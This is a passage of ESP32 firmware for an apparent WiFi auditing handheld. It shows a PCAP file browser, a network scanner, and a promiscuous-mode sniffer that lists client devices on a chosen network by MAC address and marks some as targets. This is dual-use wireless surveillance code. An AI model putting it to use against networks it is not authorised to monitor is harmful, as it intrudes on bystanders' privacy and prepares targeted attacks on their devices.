    tft.setCursor(LIST_X + 4, ry + 8);
    tft.printf("%2d.", idx + 1);
    
    String filename = pcapFiles[idx].name;
    if(filename.length() > 16) filename = filename.substring(0, 15) + "~";
    
    uint16_t nameCol;
    if(isSelected) {
      nameCol = C_RED;
    } else if(isCurrent) {
      nameCol = C_YELLOW;
    } else {
      nameCol = C_CYAN;
    }
    
    tft.setTextColor(nameCol, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setCursor(LIST_X + 26, ry + 8);
    tft.print(filename);
    
    String sizeStr;
    if(pcapFiles[idx].size < 1024) {
      sizeStr = String(pcapFiles[idx].size) + "B";
    } else if(pcapFiles[idx].size < 1024*1024) {
      sizeStr = String(pcapFiles[idx].size / 1024) + "KB";
    } else {
      sizeStr = String(pcapFiles[idx].size / (1024*1024)) + "MB";
    }
    
    tft.setTextColor(C_GREEN_DIM, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setCursor(LIST_W - 70, ry + 8);
    tft.print(sizeStr);
    
    tft.drawFastHLine(LIST_X, ry + LIST_ROW_H - 1, LIST_W, C_GREEN_DARK);
  }
  
  tft.drawFastVLine(LIST_W, LIST_Y, LIST_H, C_GREEN);
  
  if(selectedPcapFileIndex >= 0) {
    tft.fillRect(LIST_X, LIST_Y + LIST_H - 60, LIST_W, 60, C_BG);
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setCursor(LIST_X + 6, LIST_Y + LIST_H - 55);
    tft.print("Selected: " + pcapFiles[selectedPcapFileIndex].name.substring(0, 18));
    tft.setCursor(LIST_X + 6, LIST_Y + LIST_H - 40);
    tft.printf("Size: %s", 
      pcapFiles[selectedPcapFileIndex].size < 1024 ? String(pcapFiles[selectedPcapFileIndex].size).c_str() :
      pcapFiles[selectedPcapFileIndex].size < 1024*1024 ? String(pcapFiles[selectedPcapFileIndex].size / 1024).c_str() :
      String(pcapFiles[selectedPcapFileIndex].size / (1024*1024)).c_str());
    tft.print(pcapFiles[selectedPcapFileIndex].size < 1024 ? "B" : 
              pcapFiles[selectedPcapFileIndex].size < 1024*1024 ? "KB" : "MB");
    tft.setCursor(LIST_X + 6, LIST_Y + LIST_H - 25);
    tft.printf("Packets: %lu", pcapFiles[selectedPcapFileIndex].packetCount);
  }
}

void drawPCAPFileListButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "PREV",   totalPcapFiles ? C_GREEN : C_GREEN_DARK);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "NEXT",   totalPcapFiles ? C_GREEN : C_GREEN_DARK);
  drawBtn(SEL_X,     BTN_Y, BTN_W, "SELECT", totalPcapFiles ? C_GREEN : C_GREEN_DARK);
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, "DELETE", selectedPcapFileIndex >= 0 ? C_RED : C_GREEN_DARK);
  drawBtn(STOP_X,    BTN_Y, BTN_W, "BACK",   C_ORANGE);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "VIEW",   selectedPcapFileIndex >= 0 ? C_GREEN : C_GREEN_DARK);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "REFRESH", C_GREEN);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "CAPTURE", C_GREEN);
}

void handlePCAPFileListTouch(uint16_t x, uint16_t y) {
  if (y < BTN_Y || y > BTN_Y + BTN_H) return;
  
  if (x >= HOME_X && x < HOME_X + BTN_W) {
    drawBtnPressed(HOME_X, BTN_Y, BTN_W, "HOME");
    delay(120);
    
    if (pcap.isCapturing) stopPCAPCapture();
    if (pcapSnifferRunning) pcapStopClientSniffer();
    
    currentMode = MODE_MAIN_MENU;
    tft.fillScreen(C_BG);
    drawMainMenu();
    drawMainMenuButtons();
    return;
  }
  
  if (x >= PREV_X && x < PREV_X + BTN_W && totalPcapFiles > 0) {
    drawBtnPressed(PREV_X, BTN_Y, BTN_W, "PREV");
    delay(120);
    currentPcapFileIndex--;
    if(currentPcapFileIndex < 0) currentPcapFileIndex = totalPcapFiles - 1;
    displayPCAPFileList();
    drawPCAPFileListButtons();
  }
  else if (x >= NEXT_X && x < NEXT_X + BTN_W && totalPcapFiles > 0) {
    drawBtnPressed(NEXT_X, BTN_Y, BTN_W, "NEXT");
    delay(120);
    currentPcapFileIndex++;
    if(currentPcapFileIndex >= totalPcapFiles) currentPcapFileIndex = 0;
    displayPCAPFileList();
    drawPCAPFileListButtons();
  }
  else if (x >= SEL_X && x < SEL_X + BTN_W && totalPcapFiles > 0) {
    drawBtnPressed(SEL_X, BTN_Y, BTN_W, "SELECT");
    delay(120);
    if(selectedPcapFileIndex == currentPcapFileIndex) {
      selectedPcapFileIndex = -1;
      showMessage("File deselected", 800);
    } else {
      selectedPcapFileIndex = currentPcapFileIndex;
      String msg = "Selected: " + pcapFiles[currentPcapFileIndex].name.substring(0, 15);
      showMessage(msg, 1000);
    }
    displayPCAPFileList();
    drawPCAPFileListButtons();
  }
  else if (x >= DEAUTH_X && x < DEAUTH_X + BTN_W && selectedPcapFileIndex >= 0) {
    drawBtnPressed(DEAUTH_X, BTN_Y, BTN_W, "DELETE");
    delay(120);
    deleteSelectedPCAPFile();
  }
  else if (x >= STOP_X && x < STOP_X + BTN_W) {
    drawBtnPressed(STOP_X, BTN_Y, BTN_W, "BACK");
    delay(120);
    currentMode = MODE_PCAP_CAPTURE;
    tft.fillScreen(C_BG);
    displayPCAPView();
    drawPCAPButtons();
  }
  else if (x >= CONN_X && x < CONN_X + BTN_W && selectedPcapFileIndex >= 0) {
    drawBtnPressed(CONN_X, BTN_Y, BTN_W, "VIEW");
    delay(120);
    viewPCAPFileStats();
  }
  else if (x >= CLIENT_X && x < CLIENT_X + BTN_W) {
    drawBtnPressed(CLIENT_X, BTN_Y, BTN_W, "REFRESH");
    delay(120);
    scanPCAPFiles();
    currentPcapFileIndex = 0;
    selectedPcapFileIndex = -1;
    displayPCAPFileList();
    drawPCAPFileListButtons();
    showMessage("Refreshed", 800);
  }
  else if (x >= SCAN_X && x < SCAN_X + BTN_W) {
    drawBtnPressed(SCAN_X, BTN_Y, BTN_W, "CAPTURE");
    delay(120);
    currentMode = MODE_PCAP_CAPTURE;
    tft.fillScreen(C_BG);
    displayPCAPView();
    drawPCAPButtons();
  }
}

void deleteSelectedPCAPFile() {
  if(selectedPcapFileIndex < 0) {
    showMessage("Select a file first!", 1000);
    return;
  }
  
  String filename = pcapFiles[selectedPcapFileIndex].name;
  String fullpath = "/pcap/" + filename;
  
  if(SD.remove(fullpath)) {
    showMessage("Deleted: " + filename.substring(0, 15), 1500);
    scanPCAPFiles();
    selectedPcapFileIndex = -1;
    if(currentPcapFileIndex >= totalPcapFiles) currentPcapFileIndex = max(0, totalPcapFiles - 1);
    displayPCAPFileList();
    drawPCAPFileListButtons();
  } else {
    showMessage("Delete failed!", 1000);
  }
}

void viewPCAPFileStats() {
  if(selectedPcapFileIndex < 0) {
    showMessage("Select a file first!", 1000);
    return;
  }
  
  String fullpath = "/pcap/" + pcapFiles[selectedPcapFileIndex].name;
  File file = SD.open(fullpath, FILE_READ);
  if(!file) {
    showMessage("Failed to open file!", 1000);
    return;
  }
  
  pcap_hdr_t header;
  if(file.read((uint8_t*)&header, sizeof(pcap_hdr_t)) != sizeof(pcap_hdr_t)) {
    showMessage("Invalid PCAP file!", 1000);
    file.close();
    return;
  }
  
  String msg = "══════════════════\n";
  msg += "File: " + pcapFiles[selectedPcapFileIndex].name + "\n";
  msg += "══════════════════\n";
  msg += "Size: ";
  if(pcapFiles[selectedPcapFileIndex].size < 1024) {
    msg += String(pcapFiles[selectedPcapFileIndex].size) + " Bytes\n";
  } else if(pcapFiles[selectedPcapFileIndex].size < 1024*1024) {
    msg += String(pcapFiles[selectedPcapFileIndex].size / 1024) + " KB\n";
  } else {
    msg += String(pcapFiles[selectedPcapFileIndex].size / (1024*1024)) + " MB\n";
  }
  msg += "Packets: " + String(pcapFiles[selectedPcapFileIndex].packetCount) + "\n";
  msg += "══════════════════\n";
  
  if(header.network == 105) {
    msg += "Type: 802.11 WiFi\n";
  } else if(header.network == 1) {
    msg += "Type: Ethernet\n";
  } else {
    msg += "Type: Unknown\n";
  }
  
  msg += "Snaplen: " + String(header.snaplen) + " bytes";
  
  file.close();
  showMessage(msg, 4000);
}

// ============================================================
//  PCAP SEPARATE WIFI SCANNING FUNCTIONS
// ============================================================

void pcapScanNetworks() {
  if (pcap.isCapturing) {
    showMessage("Stop capture first!", 1500);
    return;
  }
  
  showMessage("Scanning networks...", 200);
  
  Serial.println("[PCAP] Starting WiFi scan...");
  
  WiFi.disconnect(true, true);
  delay(500);
  
  WiFi.mode(WIFI_OFF);
  delay(500);
  
  WiFi.mode(WIFI_STA);
  delay(500);
  
  WiFi.setSleep(false);
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  WiFi.scanDelete();
  
  silenceLogs();
  
  int found = WiFi.scanNetworks(false, true);
  
  Serial.printf("[PCAP] Scan complete, found %d networks\n", found);
  
  if (found <= 0) {
    if (found == 0) {
      showMessage("No Networks Found!", 1500);
    } else {
      showMessage("Scan Failed!", 1500);
    }
    pcapTotalNetworks = 0;
    if (currentMode == MODE_PCAP_SCAN_VIEW) {
      displayPCAPScanView();
    }
    return;
  }
  
  pcapTotalNetworks = min(found, PCAP_MAX_NETWORKS);
  pcapSelectedNetworkIndex = -1;
  pcapCurrentNetworkIndex = 0;
  
  for (int i = 0; i < pcapTotalNetworks; i++) {
    pcapNetworks[i].ssid = WiFi.SSID(i);
    if (pcapNetworks[i].ssid.length() == 0) pcapNetworks[i].ssid = "<Hidden>";
    pcapNetworks[i].rssi = WiFi.RSSI(i);
    pcapNetworks[i].channel = WiFi.channel(i);
    pcapNetworks[i].encryptionType = WiFi.encryptionType(i);
    
    uint8_t mac[6];
    if (WiFi.BSSID(i, mac)) {
      memcpy(pcapNetworks[i].bssid, mac, 6);
      char ms[18];
      sprintf(ms, "%02X:%02X:%02X:%02X:%02X:%02X", 
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
      pcapNetworks[i].bssidStr = String(ms);
    }
    
    Serial.printf("  %2d. %-24s CH%2d %4ddBm %s\n", 
      i+1, 
      pcapNetworks[i].ssid.c_str(), 
      pcapNetworks[i].channel, 
      pcapNetworks[i].rssi, 
      encStr(pcapNetworks[i].encryptionType).c_str());
  }
  
  WiFi.scanDelete();
  
  if (currentMode == MODE_PCAP_SCAN_VIEW) {
    displayPCAPScanView();
    drawPCAPScanButtons();
  }
  
  showMessage(String(pcapTotalNetworks) + " Networks Found", 1000);
  Serial.printf("[PCAP] Scan complete: %d networks found\n", pcapTotalNetworks);
}

void pcapPrevNetwork() {
  if (!pcapTotalNetworks) return;
  pcapCurrentNetworkIndex--;
  if (pcapCurrentNetworkIndex < 0) pcapCurrentNetworkIndex = pcapTotalNetworks - 1;
  if (currentMode == MODE_PCAP_SCAN_VIEW) {
    displayPCAPScanView();
  }
}

void pcapNextNetwork() {
  if (!pcapTotalNetworks) return;
  pcapCurrentNetworkIndex++;
  if (pcapCurrentNetworkIndex >= pcapTotalNetworks) pcapCurrentNetworkIndex = 0;
  if (currentMode == MODE_PCAP_SCAN_VIEW) {
    displayPCAPScanView();
  }
}

void pcapSelectNetwork() {
  if (!pcapTotalNetworks) {
    showMessage("Scan first!", 1500);
    return;
  }
  
  if (pcapSelectedNetworkIndex == pcapCurrentNetworkIndex) {
    pcapSelectedNetworkIndex = -1;
    showMessage("Network deselected", 1000);
  } else {
    pcapSelectedNetworkIndex = pcapCurrentNetworkIndex;
    String msg = "Selected: " + pcapNetworks[pcapCurrentNetworkIndex].ssid;
    showMessage(msg, 1500);
    Serial.printf("[PCAP] Selected network: %s (CH:%d)\n", 
      pcapNetworks[pcapCurrentNetworkIndex].ssid.c_str(),
      pcapNetworks[pcapCurrentNetworkIndex].channel);
  }
  
  if (currentMode == MODE_PCAP_SCAN_VIEW) {
    displayPCAPScanView();
    drawPCAPScanButtons();
  }
}

void pcapStartClientSniffer() {
  if (pcapSelectedNetworkIndex < 0) {
    showMessage("Select network first!", 1500);
    return;
  }
  
  if (pcapSnifferRunning) {
    pcapStopClientSniffer();
  }
  
  PCAPNetworkInfo* net = &pcapNetworks[pcapSelectedNetworkIndex];
  
  memcpy(pcapSniffBSSID, net->bssid, 6);
  pcapSniffSSID = net->ssid;
  
  portENTER_CRITICAL(&pcapSnifferMux);
  pcapTotalClients = 0;
  pcapSelectedClientIndex = -1;
  pcapCurrentClientIndex = 0;
  portEXIT_CRITICAL(&pcapSnifferMux);
  
  esp_wifi_set_promiscuous(false);
  delay(50);
  
  WiFi.disconnect(true, true);
  delay(100);
  WiFi.mode(WIFI_STA);
  delay(200);
  silenceLogs();
  
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&pcapClientSnifferCB);
  
  if (esp_wifi_set_promiscuous(true) != ESP_OK) {
    showMessage("Sniffer failed!", 1500);
    return;
  }
  
  esp_wifi_set_channel(net->channel, WIFI_SECOND_CHAN_NONE);
  pcapSnifferRunning = true;
  
  String msg = "Sniffing: " + net->ssid;
  showMessage(msg, 1500);
  Serial.printf("[PCAP] Client sniffer started on: %s (CH:%d)\n", 
    net->ssid.c_str(), net->channel);
  
  currentMode = MODE_PCAP_CLIENT_VIEW;
  displayPCAPClientView();
  drawPCAPClientButtons();
}

void pcapStopClientSniffer() {
  if (pcapSnifferRunning) {
    esp_wifi_set_promiscuous(false);
    pcapSnifferRunning = false;
    Serial.println("[PCAP] Client sniffer stopped");
  }
}

void pcapPrevClient() {
  if (!pcapTotalClients) return;
  pcapCurrentClientIndex--;
  if (pcapCurrentClientIndex < 0) pcapCurrentClientIndex = pcapTotalClients - 1;
  displayPCAPClientView();
}

void pcapNextClient() {
  if (!pcapTotalClients) return;
  pcapCurrentClientIndex++;
  if (pcapCurrentClientIndex >= pcapTotalClients) pcapCurrentClientIndex = 0;
  displayPCAPClientView();
}

void pcapSelectClient() {
  if (!pcapTotalClients) {
    showMessage("No clients found!", 1500);
    return;
  }
  
  if (pcapSelectedClientIndex == pcapCurrentClientIndex) {
    pcapSelectedClientIndex = -1;
    pcapClients[pcapCurrentClientIndex].targeted = false;
    showMessage("Client deselected", 1000);
  } else {
    if (pcapSelectedClientIndex >= 0) {
      pcapClients[pcapSelectedClientIndex].targeted = false;
    }
    pcapSelectedClientIndex = pcapCurrentClientIndex;
    pcapClients[pcapCurrentClientIndex].targeted = true;
    String msg = "Selected: " + pcapClients[pcapCurrentClientIndex].macStr.substring(0, 17);
    showMessage(msg, 1500);
    Serial.printf("[PCAP] Selected client: %s\n", 
      pcapClients[pcapCurrentClientIndex].macStr.c_str());
  }
  
  displayPCAPClientView();
  drawPCAPClientButtons();
}

void IRAM_ATTR pcapClientSnifferCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!pcapSnifferRunning) return;
  if (pcapTotalClients >= PCAP_MAX_CLIENTS) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  if (pkt->rx_ctrl.sig_len < 24) return;

  const uint8_t* payload = pkt->payload;
  uint8_t frameType    = payload[0] & 0x0C;
  uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;

  if (frameType == 0x00 && (frameSubtype == 0x0C || frameSubtype == 0x0A)) return;

  const uint8_t* addr1 = payload + 4;
  const uint8_t* addr2 = payload + 10;
  const uint8_t* addr3 = payload + 16;

  const uint8_t* clientMAC = NULL;
  bool isFromSelectedNetwork = false;

  if (frameType == 0x00) {
    if (memcmp(addr3, pcapSniffBSSID, 6) == 0) {
      isFromSelectedNetwork = true;
      if (memcmp(addr1, pcapSniffBSSID, 6) != 0 && !(addr1[0] & 0x01)) clientMAC = addr1;
      else if (memcmp(addr2, pcapSniffBSSID, 6) != 0 && !(addr2[0] & 0x01)) clientMAC = addr2;
    }
  } else if (frameType == 0x08) {
    uint8_t toDS   = (payload[1] & 0x01);
    uint8_t fromDS = (payload[1] & 0x02) >> 1;

    if (toDS && !fromDS) {
      if (memcmp(addr1, pcapSniffBSSID, 6) == 0) {
        isFromSelectedNetwork = true;
        if (!(addr2[0] & 0x01)) clientMAC = addr2;
      }
    } else if (!toDS && fromDS) {
      if (memcmp(addr2, pcapSniffBSSID, 6) == 0) {
        isFromSelectedNetwork = true;
        if (!(addr1[0] & 0x01)) clientMAC = addr1;
      }
    } else if (!toDS && !fromDS) {
      if (memcmp(addr3, pcapSniffBSSID, 6) == 0) {
        isFromSelectedNetwork = true;
        if (memcmp(addr1, pcapSniffBSSID, 6) != 0 && !(addr1[0] & 0x01)) clientMAC = addr1;
      }
    }
  }

  if (!isFromSelectedNetwork || !clientMAC) return;

  if (clientMAC[0] & 0x01) return;
  if (memcmp(clientMAC, pcapSniffBSSID, 6) == 0) return;
  uint8_t zero[6] = {0};
  if (memcmp(clientMAC, zero, 6) == 0) return;

  portENTER_CRITICAL_ISR(&pcapSnifferMux);

  for (int i = 0; i < pcapTotalClients; i++) {
    if (memcmp(pcapClients[i].mac, clientMAC, 6) == 0) {
      pcapClients[i].pktCount++;
      pcapClients[i].rssi = pkt->rx_ctrl.rssi;
      pcapClients[i].lastSeen = millis();
      portEXIT_CRITICAL_ISR(&pcapSnifferMux);
      return;
    }
  }

  if (pcapTotalClients < PCAP_MAX_CLIENTS) {
    int idx = pcapTotalClients;
    memcpy(pcapClients[idx].mac, clientMAC, 6);
    char ms[18];
    sprintf(ms, "%02X:%02X:%02X:%02X:%02X:%02X",
      clientMAC[0], clientMAC[1], clientMAC[2],
      clientMAC[3], clientMAC[4], clientMAC[5]);
    pcapClients[idx].macStr   = String(ms);
    pcapClients[idx].rssi     = pkt->rx_ctrl.rssi;
    pcapClients[idx].pktCount = 1;
    pcapClients[idx].targeted = false;
    pcapClients[idx].lastSeen = millis();
    memcpy(pcapClients[idx].oui, clientMAC, 3);
    pcapTotalClients++;
  }

  portEXIT_CRITICAL_ISR(&pcapSnifferMux);
}

void pcapCleanupStaleClients() {
  unsigned long now = millis();
  portENTER_CRITICAL(&pcapSnifferMux);
  int newCount = 0;
  for (int i = 0; i < pcapTotalClients; i++) {
    if (now - pcapClients[i].lastSeen < 30000) {
      if (i != newCount) {
        memcpy(&pcapClients[newCount], &pcapClients[i], sizeof(PCAPClientInfo));
      }
      newCount++;
    }
  }
  pcapTotalClients = newCount;
  if (pcapSelectedClientIndex >= pcapTotalClients) pcapSelectedClientIndex = -1;
  if (pcapCurrentClientIndex >= pcapTotalClients) pcapCurrentClientIndex = 0;
  portEXIT_CRITICAL(&pcapSnifferMux);
}

// ============================================================
//  PCAP DISPLAY FUNCTIONS
// ============================================================

void displayPCAPView() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W + RADAR_PANEL_W, LIST_H, C_BG);
  
  int centerX = 240;
  int y = LIST_Y + 20;
  
  tft.setTextColor(C_CYAN, C_BG);
  tft.setTextSize(2);
  tft.setCursor(centerX - 60, y);
  tft.print("PCAP CAPTURE");
  y += 25;
  
  if(pcap.filterByDevice) {
    tft.setTextColor(C_RED, C_BG);
    tft.setTextSize(1);
    tft.setCursor(centerX - 100, y);
    tft.print("Device: " + pcap.targetDeviceMACStr.substring(0, 17));
    y += 15;
  } else if(pcap.filterByNetwork) {
    tft.setTextColor(C_YELLOW, C_BG);
    tft.setTextSize(1);
    tft.setCursor(centerX - 100, y);
    tft.print("Network: " + pcap.targetSSID.substring(0, 15));
    y += 15;
  } else {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setTextSize(1);
    tft.setCursor(centerX - 80, y);
    tft.print("Capturing ALL traffic");
    y += 15;
  }
  
  tft.drawFastHLine(centerX - 120, y, 240, C_GREEN_DARK);
  y += 10;
  
  if(pcap.isCapturing) {
    tft.setTextColor(C_GREEN, C_BG);
    tft.setTextSize(2);
    tft.setCursor(centerX - 40, y);
    tft.print("RECORDING");
    y += 25;
    
    tft.setTextColor(C_WHITE, C_BG);
    tft.setTextSize(1);
    tft.setCursor(centerX - 80, y);
    tft.print("File: " + pcap.filename.substring(6, 20) + "...");
    y += 20;
    
    tft.setCursor(centerX - 80, y);
    tft.printf("Packets: %lu", pcap.packetCount);
    y += 20;
    
    tft.setCursor(centerX - 80, y);
    tft.printf("Size: %lu KB", pcap.fileSize / 1024);
    y += 20;
    
    int barWidth = 200;
    int barX = centerX - barWidth/2;
    tft.drawRect(barX, y, barWidth, 15, C_GREEN);
    
    float progress = (float)pcap.packetCount / pcap.maxPackets;
    if(progress > 1.0) progress = 1.0;
    tft.fillRect(barX + 1, y + 1, barWidth * progress - 2, 13, C_GREEN);
    y += 25;
    
    uint32_t elapsed = (millis() - pcap.startTime) / 1000;
    tft.setCursor(centerX - 40, y);
    tft.printf("Time: %02lu:%02lu", elapsed/60, elapsed%60);
    
  } else {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setTextSize(1);
    tft.setCursor(centerX - 100, y);
    tft.print("Ready to capture packets");
    y += 20;
    
    tft.setCursor(centerX - 100, y);
    tft.print("Press START to begin");
    y += 15;
    
    tft.setCursor(centerX - 100, y);
    tft.print("Press SCAN to select target");
    y += 15;
    
    tft.drawFastHLine(centerX - 100, y, 200, C_GREEN_DARK);
    y += 10;
    
    tft.setTextColor(C_CYAN, C_BG);
    tft.setCursor(centerX - 100, y);
    if(SD.begin(SD_CS)) {
      tft.print("SD Card: OK");
      uint64_t total = SD.totalBytes() / (1024 * 1024);
      uint64_t used = SD.usedBytes() / (1024 * 1024);
      y += 12;
      tft.setCursor(centerX - 100, y);
      tft.printf("Free: %llu/%llu MB", total - used, total);
    } else {
      tft.setTextColor(C_RED, C_BG);
      tft.print("SD Card: Not Found");
    }
  }
}

void displayPCAPScanView() {
  tft.fillRect(0, LIST_Y, SCREEN_W, LIST_H, C_BG);
  
  tft.setTextColor(C_GREEN, C_BG);
  tft.setTextSize(1);
  tft.setCursor(6, LIST_Y + 6);
  tft.print("PCAP TARGETS");
  
  tft.setTextColor(C_GREEN_DIM, C_BG);
  tft.setCursor(SCREEN_W - 80, LIST_Y + 6);
  tft.printf("%d", pcapTotalNetworks);
  
  tft.drawFastHLine(0, LIST_Y + LIST_HEADER_H, SCREEN_W, C_GREEN_DARK);
  
  if(pcapTotalNetworks == 0) {
    tft.setTextColor(C_GREEN_DARK, C_BG);
    tft.setCursor(SCREEN_W/2 - 60, LIST_Y + 100);
    tft.print("[ NO NETWORKS ]");
    tft.setCursor(SCREEN_W/2 - 80, LIST_Y + 120);
    tft.print("Press SCAN to find networks");
    return;
  }
  
  int startIdx = pcapCurrentNetworkIndex - LIST_ROWS/2;
  if(startIdx < 0) startIdx = 0;
  if(startIdx > pcapTotalNetworks - LIST_ROWS) startIdx = max(0, pcapTotalNetworks - LIST_ROWS);
  
  for(int row = 0; row < LIST_ROWS && (startIdx + row) < pcapTotalNetworks; row++) {
    int idx = startIdx + row;
    int ry = LIST_Y + LIST_HEADER_H + 2 + row * LIST_ROW_H;
    bool isCurrent = (idx == pcapCurrentNetworkIndex);
    bool isSelected = (idx == pcapSelectedNetworkIndex);
    
    if(isCurrent) {
      tft.fillRect(0, ry, SCREEN_W, LIST_ROW_H-1, C_GREEN_DARK);
    }
    
    tft.setTextColor(isSelected ? C_RED : C_GREEN_DIM, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setTextSize(1);
    tft.setCursor(4, ry + 8);
    tft.printf("%2d.", idx + 1);
    
    String ssid = pcapNetworks[idx].ssid;
    if(ssid.length() > 24) ssid = ssid.substring(0, 23) + "~";
    
    uint16_t ssidCol;
    if(isSelected) {
      ssidCol = C_RED;
    } else if(isCurrent) {
      ssidCol = C_YELLOW;
    } else {
      ssidCol = C_CYAN;
    }
    
    tft.setTextColor(ssidCol, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setCursor(40, ry + 8);
    tft.print(ssid);
    
    tft.setTextColor(C_GREEN_DIM, isCurrent ? C_GREEN_DARK : C_BG);
    tft.setCursor(SCREEN_W - 100, ry + 8);
    tft.printf("CH%2d", pcapNetworks[idx].channel);
    
    drawSignalBars(SCREEN_W - 50, ry + 6, pcapNetworks[idx].rssi);
    
    tft.drawFastHLine(0, ry + LIST_ROW_H - 1, SCREEN_W, C_GREEN_DARK);
  }
  
  if(pcapSelectedNetworkIndex >= 0) {
    tft.fillRect(0, SCREEN_H - 40, SCREEN_W, 40, C_BG);
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setCursor(10, SCREEN_H - 30);
    tft.print("Selected: ");
    tft.setTextColor(C_RED, C_BG);
    tft.print(pcapNetworks[pcapSelectedNetworkIndex].ssid.substring(0, 30));
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.printf(" (CH:%d, RSSI:%d dBm)", 
      pcapNetworks[pcapSelectedNetworkIndex].channel,
      pcapNetworks[pcapSelectedNetworkIndex].rssi);
  }
}

void displayPCAPClientView() {
  tft.fillRect(LIST_X, LIST_Y, LIST_W + RADAR_PANEL_W, LIST_H, C_BG);
  
  int centerX = 240;
  int y = LIST_Y + 15;
  
  tft.setTextColor(C_CYAN, C_BG);
  tft.setTextSize(2);
  tft.setCursor(centerX - 60, y);
  tft.print("PCAP CLIENTS");
  y += 10;
  
  if(pcapSnifferRunning && pcapSelectedNetworkIndex >= 0) {
    tft.setTextColor(C_GREEN, C_BG);
    tft.setTextSize(1);
    tft.setCursor(centerX - 100, y);
    tft.print("Sniffing: " + pcapNetworks[pcapSelectedNetworkIndex].ssid.substring(0, 20));
    y += 18;
    tft.setCursor(centerX - 100, y);
    tft.print("Clients: " + String(pcapTotalClients));
    y += 20;
  } else {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setCursor(centerX - 80, y);
    tft.print("Select network first");
    y += 20;
    tft.setCursor(centerX - 70, y);
    tft.print("Press SCAN to start");
    y += 20;
    tft.drawFastHLine(centerX - 100, y, 200, C_GREEN_DARK);
    y += 15;
  }
  
  if(pcapTotalClients > 0) {
    tft.drawFastHLine(centerX - 120, y, 240, C_GREEN_DARK);
    y += 15;
    
    int startIdx = pcapCurrentClientIndex - 5;
    if(startIdx < 0) startIdx = 0;
    if(startIdx > pcapTotalClients - 8) startIdx = max(0, pcapTotalClients - 8);
    
    for(int row = 0; row < 7 && (startIdx + row) < pcapTotalClients; row++) {
      int idx = startIdx + row;
      bool isCurrent = (idx == pcapCurrentClientIndex);
      bool isSelected = (idx == pcapSelectedClientIndex);
      
      if(isCurrent) {
        tft.fillRect(centerX - 110, y-2, 220, 32, C_GREEN_DARK);
      }
      
      tft.setTextColor(isSelected ? C_RED : C_CYAN, isCurrent ? C_GREEN_DARK : C_BG);
      tft.setCursor(centerX - 100, y);
      String mac = pcapClients[idx].macStr;
      tft.print(mac.substring(0, 17));
      
      tft.setTextColor(sigColor(pcapClients[idx].rssi), isCurrent ? C_GREEN_DARK : C_BG);
      tft.setCursor(centerX + 20, y);
      tft.printf("%d dBm", pcapClients[idx].rssi);
      
      y += 12;
      
      tft.setTextColor(C_GREEN_DIM, isCurrent ? C_GREEN_DARK : C_BG);
      tft.setCursor(centerX - 100, y);
      tft.print("Vendor: " + getManufacturer(pcapClients[idx].oui));
      
      tft.setCursor(centerX + 70, y);
      tft.printf("Pkts: %lu", pcapClients[idx].pktCount);
      
      y += 22;
    }
    
    if(pcapSelectedClientIndex >= 0) {
      tft.setTextColor(C_RED, C_BG);
      tft.setCursor(centerX - 100, y + 5);
      tft.print("Target: " + pcapClients[pcapSelectedClientIndex].macStr.substring(0, 17));
    }
  } else if(pcapSnifferRunning && pcapTotalClients == 0) {
    tft.setTextColor(C_GREEN_DIM, C_BG);
    tft.setCursor(centerX - 80, y);
    tft.print("No clients detected");
    y += 20;
    tft.setCursor(centerX - 100, y);
    tft.print("Generate traffic to");
    y += 15;
    tft.setCursor(centerX - 80, y);
    tft.print("discover devices");
  }
}

void drawPCAPButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
  drawBtn(HOME_X,    BTN_Y, BTN_W, "HOME",   C_CYAN);
  drawBtn(PREV_X,    BTN_Y, BTN_W, "LIST",   C_GREEN);
  drawBtn(NEXT_X,    BTN_Y, BTN_W, "VIEW",   C_GREEN);
  drawBtn(SEL_X,     BTN_Y, BTN_W, pcap.filterByDevice ? "CLR" : 
          (pcap.filterByNetwork ? "CLEAR" : "TARGET"), 
          pcap.filterByDevice ? C_RED : (pcap.filterByNetwork ? C_ORANGE : C_GREEN));
  drawBtn(DEAUTH_X,  BTN_Y, BTN_W, pcap.isCapturing ? "STOP" : "START", 
          pcap.isCapturing ? C_RED : C_GREEN);
  drawBtn(STOP_X,    BTN_Y, BTN_W, "CLEAR",  C_GREEN_DARK);
  drawBtn(CONN_X,    BTN_Y, BTN_W, "SCAN",   C_GREEN);
  drawBtn(CLIENT_X,  BTN_Y, BTN_W, "DEVICE", C_GREEN);
  drawBtn(SCAN_X,    BTN_Y, BTN_W, "STATS",  C_GREEN);
}

void drawPCAPScanButtons() {
  tft.fillRect(0, BTN_Y-2, SCREEN_W, SCREEN_H-BTN_Y+2, C_BG);
  tft.drawFastHLine(0, BTN_Y-2, SCREEN_W, C_GREEN);
  
